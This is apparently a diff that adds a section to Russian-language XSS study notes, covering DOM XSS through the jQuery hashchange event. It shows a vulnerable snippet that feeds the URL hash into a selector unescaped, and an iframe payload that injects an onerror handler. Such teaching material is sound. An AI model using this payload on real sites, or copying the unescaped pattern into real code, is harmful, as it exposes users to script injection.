@@ -117,3 +117,25 @@ Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-c
 
 ## Обход фильтров:
 https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+
+
+
+### Частные случаи XSS
+
+### XSS VIA HASHCHANGE EVENT
+
+Если есть уязвимый код:
+
+```js
+$(window).on('hashchange', function(){
+      var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); /* Нет валидации и экранирования */
+      /* jQuery интерпретирует это как HTML-тег и выполняет JavaScript! */
+    if (post) post.scrollIntoView();
+});
+```
+Для того, чтобы стригерить событие hashchange достаточно жертве отправить вредоносную страницу,
+на которой будет iframe-элемент:
+
+```html
+<iframe src="https://vuln-site-with-hashchange-func.com/#" onload="this.src+='<img src=1 onerror=print()>'">
+```
